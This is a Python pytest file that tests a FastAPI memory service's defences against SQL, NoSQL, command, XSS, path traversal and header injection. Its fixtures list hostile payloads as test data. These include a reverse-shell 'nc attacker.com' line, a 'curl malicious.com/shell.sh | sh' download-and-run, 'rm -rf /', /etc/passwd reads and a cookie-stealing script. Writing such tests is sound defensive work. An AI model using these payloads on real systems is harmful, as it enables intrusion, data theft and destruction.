"""
Security Tests for Injection Attack Prevention
===============================================

Tests protection against:
- SQL Injection
- NoSQL Injection
- Command Injection
- XSS (Cross-Site Scripting)
- Path Traversal
- LDAP Injection
- XML Injection
"""
import pytest
from fastapi.testclient import TestClient
from backend.api.api_server import app
from backend.config.auth_config import SecurityConfig


class TestSQLInjection:
    """Test SQL injection prevention."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def valid_headers(self):
        """Get valid authentication headers."""
        return {"X-API-Key": SecurityConfig.get_api_key()}

    @pytest.fixture
    def sql_injection_payloads(self):
        """Common SQL injection attack payloads."""
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' OR 'x'='x",
            "1' UNION SELECT NULL--",
            "' DROP TABLE users--",
            "'; DROP TABLE memories;--",
            "1' AND '1'='1",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "admin' OR '1'='1'/*",
        ]

    def test_memory_query_sql_injection(self, client, valid_headers, sql_injection_payloads):
        """Test that memory query is protected against SQL injection."""
        for payload in sql_injection_payloads:
            response = client.post(
                "/v1/memory/query",
                json={"query": payload, "top_k": 5},
                headers=valid_headers
            )

            # Should either succeed safely or return 400 (validation error)
            # Should NOT return 500 (server error from SQL injection)
            assert response.status_code in [200, 400, 429], \
                f"SQL injection payload should be handled safely: {payload}"

            # Check that response doesn't contain SQL error messages
            response_text = response.text.lower()
            sql_errors = ["sql", "syntax error", "mysql", "postgresql", "sqlite"]
            for error in sql_errors:
                assert error not in response_text, \
                    f"Response should not leak SQL error details: {payload}"

    def test_memory_content_sql_injection(self, client, valid_headers, sql_injection_payloads):
        """Test that memory content storage is protected against SQL injection."""
        for payload in sql_injection_payloads:
            response = client.post(
                "/v1/memory/add",
                json={"content": payload, "tags": ["test"]},
                headers=valid_headers
            )

            # Should succeed (content is user data) or validate
            assert response.status_code in [200, 201, 400, 429], \
                f"Content should be stored safely even with SQL-like syntax: {payload}"


class TestNoSQLInjection:
    """Test NoSQL injection prevention (relevant for Qdrant/vector DB)."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def valid_headers(self):
        """Get valid authentication headers."""
        return {"X-API-Key": SecurityConfig.get_api_key()}

    @pytest.fixture
    def nosql_injection_payloads(self):
        """Common NoSQL injection attack payloads."""
        return [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
            '{"$ne": null}',
            '{"$gt": ""}',
        ]

    def test_memory_query_nosql_injection(self, client, valid_headers, nosql_injection_payloads):
        """Test protection against NoSQL injection in queries."""
        for payload in nosql_injection_payloads:
            # Try as string
            if isinstance(payload, str):
                response = client.post(
                    "/v1/memory/query",
                    json={"query": payload, "top_k": 5},
                    headers=valid_headers
                )

                assert response.status_code in [200, 400, 429], \
                    f"NoSQL injection should be prevented: {payload}"


class TestCommandInjection:
    """Test command injection prevention."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def valid_headers(self):
        """Get valid authentication headers."""
        return {"X-API-Key": SecurityConfig.get_api_key()}

    @pytest.fixture
    def command_injection_payloads(self):
        """Common command injection attack payloads."""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(cat /etc/passwd)",
            "; ping -c 10 127.0.0.1",
            "| nc attacker.com 4444",
            "; curl http://malicious.com/shell.sh | sh",
        ]

    def test_content_command_injection(self, client, valid_headers, command_injection_payloads):
        """Test that content field prevents command injection."""
        for payload in command_injection_payloads:
            response = client.post(
                "/v1/memory/add",
                json={"content": payload, "tags": ["test"]},
                headers=valid_headers
            )

            # Should succeed (stored as data) or validate
            assert response.status_code in [200, 201, 400, 429], \
                f"Command injection should be prevented: {payload}"

            # Verify no system command was executed
            # (This is hard to test directly, but we check for error patterns)
            if response.status_code >= 500:
                assert "command" not in response.text.lower(), \
                    "System should not execute shell commands from user input"


class TestXSSPrevention:
    """Test XSS (Cross-Site Scripting) prevention."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def valid_headers(self):
        """Get valid authentication headers."""
        return {"X-API-Key": SecurityConfig.get_api_key()}

    @pytest.fixture
    def xss_payloads(self):
        """Common XSS attack payloads."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert('XSS')>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<script>fetch('http://malicious.com?cookie='+document.cookie)</script>",
        ]

    def test_memory_content_xss_prevention(self, client, valid_headers, xss_payloads):
        """Test that XSS payloads in content are handled safely."""
        for payload in xss_payloads:
            # Store XSS payload
            add_response = client.post(
                "/v1/memory/add",
                json={"content": payload, "tags": ["xss_test"]},
                headers=valid_headers
            )

            assert add_response.status_code in [200, 201, 400, 429]

            # If stored successfully, retrieve it
            if add_response.status_code in [200, 201]:
                query_response = client.post(
                    "/v1/memory/query",
                    json={"query": "xss_test", "top_k": 5},
                    headers=valid_headers
                )

                # Response should have proper content type (JSON, not HTML)
                assert "application/json" in query_response.headers.get("content-type", ""), \
                    "Response should be JSON to prevent XSS execution"

                # Check for security headers
                assert "X-Content-Type-Options" in query_response.headers or \
                       query_response.headers.get("content-type") == "application/json", \
                    "Security headers should prevent XSS"

    def test_xss_in_query_parameter(self, client, valid_headers, xss_payloads):
        """Test XSS prevention in query parameters."""
        for payload in xss_payloads:
            response = client.post(
                "/v1/memory/query",
                json={"query": payload, "top_k": 5},
                headers=valid_headers
            )

            # Should handle safely
            assert response.status_code in [200, 400, 429]

            # Response should not reflect unescaped user input
            if response.status_code == 200:
                # Verify content-type is JSON
                assert "application/json" in response.headers.get("content-type", "")


class TestPathTraversal:
    """Test path traversal attack prevention."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def valid_headers(self):
        """Get valid authentication headers."""
        return {"X-API-Key": SecurityConfig.get_api_key()}

    @pytest.fixture
    def path_traversal_payloads(self):
        """Common path traversal attack payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "../../../../../../../../../../etc/passwd",
        ]

    def test_path_traversal_in_content(self, client, valid_headers, path_traversal_payloads):
        """Test that path traversal attempts in content are handled safely."""
        for payload in path_traversal_payloads:
            response = client.post(
                "/v1/memory/add",
                json={"content": payload, "tags": ["test"]},
                headers=valid_headers
            )

            # Should succeed (it's just user data) or validate
            assert response.status_code in [200, 201, 400, 429], \
                f"Path traversal should not cause errors: {payload}"

            # Verify no file system access occurred
            if response.status_code >= 500:
                error_msg = response.text.lower()
                assert "no such file" not in error_msg and \
                       "permission denied" not in error_msg, \
                    "Should not attempt file system access"


class TestHeaderInjection:
    """Test HTTP header injection prevention."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def valid_headers(self):
        """Get valid authentication headers."""
        return {"X-API-Key": SecurityConfig.get_api_key()}

    def test_crlf_injection_in_headers(self, client, valid_headers):
        """Test CRLF injection prevention in headers."""
        malicious_headers = {
            **valid_headers,
            "X-Custom": "value\r\nX-Injected: malicious"
        }

        response = client.post(
            "/v1/memory/query",
            json={"query": "test", "top_k": 1},
            headers=malicious_headers
        )

        # Should either reject or sanitize
        # Check that injected header is not in response
        assert "X-Injected" not in response.headers

    def test_newline_injection_in_api_key(self, client):
        """Test newline injection in API key header."""
        response = client.get(
            "/v1/health",
            headers={"X-API-Key": "key\nX-Injected: value"}
        )

        # Should be rejected or sanitized
        assert response.status_code in [400, 401]


class TestLDAPInjection:
    """Test LDAP injection prevention (if LDAP is used)."""

    def test_ldap_injection_prevention(self):
        """Test LDAP injection prevention."""
        # TODO: Implement if LDAP authentication is added
        pass


class TestXMLInjection:
    """Test XML injection prevention (if XML parsing is used)."""

    def test_xxe_prevention(self):
        """Test XXE (XML External Entity) attack prevention."""
        # TODO: Implement if XML parsing is added
        pass


class TestInputValidation:
    """Test general input validation and sanitization."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def valid_headers(self):
        """Get valid authentication headers."""
        return {"X-API-Key": SecurityConfig.get_api_key()}

    def test_null_byte_injection(self, client, valid_headers):
        """Test null byte injection prevention."""
        payloads = [
            "test\x00.txt",
            "test%00.txt",
            "test\0malicious",
        ]

        for payload in payloads:
            response = client.post(
                "/v1/memory/add",
                json={"content": payload, "tags": ["test"]},
                headers=valid_headers
            )

            # Should handle safely
            assert response.status_code in [200, 201, 400, 429]

    def test_unicode_injection(self, client, valid_headers):
        """Test unicode normalization attack prevention."""
        payloads = [
            "\u0000",  # Null character
            "\u202E",  # Right-to-left override
            "\uFEFF",  # Zero-width no-break space
            "test\u200B",  # Zero-width space
        ]

        for payload in payloads:
            response = client.post(
                "/v1/memory/add",
                json={"content": f"test {payload} content"},
                headers=valid_headers
            )

            assert response.status_code in [200, 201, 400, 429]

    def test_content_length_validation(self, client, valid_headers):
        """Test that content length limits are enforced."""
        # Very long content
        long_content = "x" * 100000  # 100KB

        response = client.post(
            "/v1/memory/add",
            json={"content": long_content},
            headers=valid_headers
        )

        # Should reject or handle appropriately
        assert response.status_code in [400, 413, 429], \
            "Excessively long content should be rejected"

    def test_tag_validation(self, client, valid_headers):
        """Test tag validation and sanitization."""
        malicious_tags = [
            ["<script>alert('xss')</script>"],
            ["../../etc/passwd"],
            ["tag\x00injection"],
            ["; DROP TABLE tags;"],
        ]

        for tags in malicious_tags:
            response = client.post(
                "/v1/memory/add",
                json={"content": "test", "tags": tags},
                headers=valid_headers
            )

            # Should either succeed (sanitized) or validate
            assert response.status_code in [200, 201, 400, 429]

    def test_special_character_handling(self, client, valid_headers):
        """Test handling of special characters."""
        special_chars = [
            "test & content",
            "test < content",
            "test > content",
            "test ' content",
            'test " content',
            "test \\ content",
            "test / content",
        ]

        for content in special_chars:
            response = client.post(
                "/v1/memory/add",
                json={"content": content},
                headers=valid_headers
            )

            assert response.status_code in [200, 201, 400, 429], \
                f"Special characters should be handled: {content}"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
